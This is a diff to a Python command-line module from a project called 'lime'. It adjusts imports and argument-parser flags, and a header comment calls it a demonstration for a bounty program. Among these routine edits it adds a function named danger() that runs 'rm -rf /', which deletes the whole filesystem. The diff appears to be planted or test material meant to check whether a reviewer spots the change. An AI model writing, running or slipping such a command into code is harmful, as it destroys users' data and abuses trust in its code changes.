@@ -1,7 +1,7 @@
 # NOTE: this is simply for demonstration purposes of our bounty program
 #      and is not a part of the official codebase
 
-import openai
+
 import os, time, uuid, sys, glob
 from datetime import datetime
 from typing import (
@@ -11,6 +11,7 @@ from typing import (
 )
 from lime.common.controllers.parse import (
     parse_to_obj,
+    extract_gen_params,
 )
 from lime.common.models.internal import (
     SheetSchema,
@@ -294,6 +295,9 @@ def get_sheet_fns(input_paths : List[str]) -> List[str]:
         raise BaseQuietError(f'No input files found in: {input_paths}')
     return all_sheet_fns
 
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
 
 def setup_parser(parser):
     
@@ -303,8 +307,8 @@ def setup_parser(parser):
     # Optional arguments, will overwrite config loaded defaults
     parser.add_argument('-m', '--model_name',    type=str)
     parser.add_argument('-y', '--dry_run',       action='store_true')
-    # parser.add_argument('-v', '--verbose',       action='count')
-    # parser.add_argument('-w', '--wet_run',       action='count')
+    parser.add_argument('-v', '--verbose',       action='count')
+    parser.add_argument('-w', '--wet_run',       action='count')
     parser.add_argument('-b', '--debug',         action='store_true')
     
 
